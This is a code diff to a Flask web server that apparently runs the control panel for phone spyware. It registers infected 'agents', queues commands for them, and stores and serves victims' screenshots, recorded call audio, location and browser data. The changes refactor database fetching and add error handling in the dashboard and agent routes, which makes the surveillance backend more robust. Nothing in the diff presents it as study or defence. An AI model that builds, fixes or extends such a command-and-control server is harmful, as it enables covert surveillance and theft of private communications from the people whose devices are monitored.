@@ -170,6 +170,22 @@ def log_event(level, message):
                 print(f"❌ Failed to log event after {max_retries} attempts: {e}")
                 break
 
+def row_to_dict(row):
+    """Convert SQLite Row object to dictionary"""
+    if row is None:
+        return None
+    return {key: row[key] for key in row.keys()}
+
+def safe_fetchone(cursor):
+    """Safely fetch one row and convert to dict"""
+    row = cursor.fetchone()
+    return row_to_dict(row) if row else None
+
+def safe_fetchall(cursor):
+    """Safely fetch all rows and convert to list of dicts"""
+    rows = cursor.fetchall()
+    return [row_to_dict(row) for row in rows] if rows else []
+
 # Initialize database on startup
 init_database()
 
@@ -182,30 +198,24 @@ def debug_agents():
     
     with db_lock:
         conn = get_db_connection()
-        agents = conn.execute("SELECT * FROM agents").fetchall()
+        agents = safe_fetchall(conn.execute("SELECT * FROM agents"))
         conn.close()
     
     result = "<h1>All Agents in Database</h1>"
     for agent in agents:
-        # Convert sqlite3.Row to dict for safe access
-        agent_dict = dict(agent)
-        user_agent = agent_dict.get('user_agent', 'N/A')
+        user_agent = agent.get('user_agent', 'N/A')
         if not user_agent:
             user_agent = 'N/A'
             
         result += f"""
         <div style="border: 1px solid #ccc; padding: 10px; margin: 10px;">
-            <strong>ID:</strong> {agent_dict['id']}<br>
-            <strong>Agent ID:</strong> {agent_dict['agent_id']}<br>
-            <strong>Status:</strong> {agent_dict['status']}<br>
-            <strong>Phone Model:</strong> {agent_dict['phone_model']}<br>
+            <strong>ID:</strong> {agent['id']}<br>
+            <strong>Agent ID:</strong> {agent['agent_id']}<br>
+            <strong>Status:</strong> {agent.get('status', 'unknown')}<br>
+            <strong>Phone Model:</strong> {agent.get('phone_model', 'Unknown')}<br>
             <strong>User Agent:</strong> {user_agent}<br>
-            <strong>Last Seen:</strong> {agent_dict['last_seen']}<br>
-            <strong>First Seen:</strong> {agent_dict['first_seen']}<br>
-            <strong>Screenshot Count:</strong> {agent_dict['screenshot_count']}<br>
-            <strong>Call Records:</strong> {agent_dict['call_records']}<br>
-            <strong>Battery Level:</strong> {agent_dict['battery_level']}<br>
-            <strong>Location Data:</strong> {agent_dict['location_data']}<br>
+            <strong>Last Seen:</strong> {agent.get('last_seen', 'Never')}<br>
+            <strong>First Seen:</strong> {agent.get('first_seen', 'Never')}<br>
         </div>
         """
     
@@ -241,12 +251,6 @@ def index():
         return redirect('/dashboard')
     return redirect('/login')
 
-def row_to_dict(row):
-    """Convert SQLite Row object to dictionary"""
-    if row is None:
-        return None
-    return {key: row[key] for key in row.keys()}
-
 @app.route('/dashboard')
 def dashboard():
     if not session.get('authenticated'):
@@ -255,24 +259,36 @@ def dashboard():
     with db_lock:
         conn = get_db_connection()
         
-        # Get statistics - FIXED: Handle None values
-        stats = {
-            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0] or 0,
-            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0] or 0,
-            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0] or 0,
-            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0] or 0
-        }
+        # Get statistics with proper error handling
+        try:
+            stats = {
+                'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
+                'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
+                'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
+                'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
+            }
+        except Exception as e:
+            print(f"Error getting stats: {e}")
+            stats = {'active_agents': 0, 'total_screenshots': 0, 'total_calls': 0, 'total_deployments': 0}
         
-        # Get recent data - Convert rows to dictionaries
-        all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
-        active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
-        screenshots = [row_to_dict(row) for row in conn.execute('''
-            SELECT s.*, a.phone_model FROM screenshots s 
-            JOIN agents a ON s.agent_id = a.agent_id 
-            ORDER BY s.timestamp DESC LIMIT 16
-        ''').fetchall()]
-        calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
-        deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
+        # Get recent data with proper error handling
+        try:
+            all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
+            active_agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20"))
+            screenshots = safe_fetchall(conn.execute('''
+                SELECT s.*, a.phone_model FROM screenshots s 
+                LEFT JOIN agents a ON s.agent_id = a.agent_id 
+                ORDER BY s.timestamp DESC LIMIT 16
+            '''))
+            calls = safe_fetchall(conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15"))
+            deployments = safe_fetchall(conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15"))
+        except Exception as e:
+            print(f"Error fetching data: {e}")
+            all_agents = []
+            active_agents = []
+            screenshots = []
+            calls = []
+            deployments = []
         
         conn.close()
     
@@ -295,27 +311,48 @@ def admin_dashboard():
     with db_lock:
         conn = get_db_connection()
         
-        # Get comprehensive statistics - FIXED: Handle None values
-        stats = {
-            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0] or 0,
-            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0] or 0,
-            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0] or 0,
-            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0] or 0,
-            'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0] or 0
-        }
+        # Get comprehensive statistics with error handling
+        try:
+            stats = {
+                'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
+                'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
+                'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
+                'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
+                'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
+            }
+        except Exception as e:
+            print(f"Error getting admin stats: {e}")
+            stats = {
+                'active_agents': 0, 
+                'total_screenshots': 0, 
+                'total_calls': 0, 
+                'total_deployments': 0,
+                'pending_commands': 0
+            }
         
-        # Get recent data - Convert rows to dictionaries
-        all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
-        active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
-        screenshots = [row_to_dict(row) for row in conn.execute('''
-            SELECT s.*, a.phone_model FROM screenshots s 
-            JOIN agents a ON s.agent_id = a.agent_id 
-            ORDER BY s.timestamp DESC LIMIT 16
-        ''').fetchall()]
-        calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
-        deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
-        commands = [row_to_dict(row) for row in conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10").fetchall()]
-        logs = [row_to_dict(row) for row in conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20").fetchall()]
+        # Get recent data with error handling
+        try:
+            all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
+            active_agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20"))
+            screenshots = safe_fetchall(conn.execute('''
+                SELECT s.*, COALESCE(a.phone_model, 'Unknown Device') as phone_model 
+                FROM screenshots s 
+                LEFT JOIN agents a ON s.agent_id = a.agent_id 
+                ORDER BY s.timestamp DESC LIMIT 16
+            '''))
+            calls = safe_fetchall(conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15"))
+            deployments = safe_fetchall(conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15"))
+            commands = safe_fetchall(conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10"))
+            logs = safe_fetchall(conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20"))
+        except Exception as e:
+            print(f"Error fetching admin data: {e}")
+            all_agents = []
+            active_agents = []
+            screenshots = []
+            calls = []
+            deployments = []
+            commands = []
+            logs = []
         
         conn.close()
     
@@ -331,7 +368,6 @@ def admin_dashboard():
                          commands=commands,
                          logs=logs,
                          platform_url=platform_url)
-
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -432,9 +468,9 @@ def register_agent():
             conn = get_db_connection()
             
             # Check if agent exists
-            existing_agent = conn.execute(
+            existing_agent = safe_fetchone(conn.execute(
                 "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
-            ).fetchone()
+            ))
             
             current_time = datetime.now()
             
@@ -480,10 +516,10 @@ def register_agent():
             conn.commit()
             
             # Check for pending commands
-            pending_commands = conn.execute(
+            pending_commands = safe_fetchall(conn.execute(
                 "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
                 (agent_id,)
-            ).fetchall()
+            ))
             conn.close()
         
         log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
@@ -710,9 +746,9 @@ def serve_screenshot(screenshot_id):
     
     with db_lock:
         conn = get_db_connection()
-        screenshot = conn.execute(
+        screenshot = safe_fetchone(conn.execute(
             "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
-        ).fetchone()
+        ))
         conn.close()
     
     if screenshot and screenshot['screenshot_data']:
@@ -726,9 +762,9 @@ def serve_call_audio(call_id):
     
     with db_lock:
         conn = get_db_connection()
-        call = conn.execute(
+        call = safe_fetchone(conn.execute(
             "SELECT audio_data FROM call_records WHERE id = ?", (call_id,)
-        ).fetchone()
+        ))
         conn.close()
     
     if call and call['audio_data']:
@@ -812,10 +848,10 @@ def check_commands(agent_id):
     """Agents check for pending commands"""
     with db_lock:
         conn = get_db_connection()
-        commands = conn.execute(
+        commands = safe_fetchall(conn.execute(
             "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
             (agent_id,)
-        ).fetchall()
+        ))
         conn.close()
     
     commands_list = [{'id': cmd['id'], 'command': cmd['command']} for cmd in commands]
@@ -1521,18 +1557,18 @@ def view_web_data(agent_id):
     
     with db_lock:
         conn = get_db_connection()
-        web_data = conn.execute(
+        web_data = safe_fetchall(conn.execute(
             "SELECT * FROM browser_data WHERE agent_id = ? ORDER BY timestamp DESC",
             (agent_id,)
-        ).fetchall()
-        agent = conn.execute(
+        ))
+        agent = safe_fetchone(conn.execute(
             "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
-        ).fetchone()
+        ))
         conn.close()
     
     return render_template('web_data.html', 
                          web_data=web_data, 
-                         agent=row_to_dict(agent) if agent else None)
+                         agent=agent)
 
 @app.route('/logout')
 def logout():
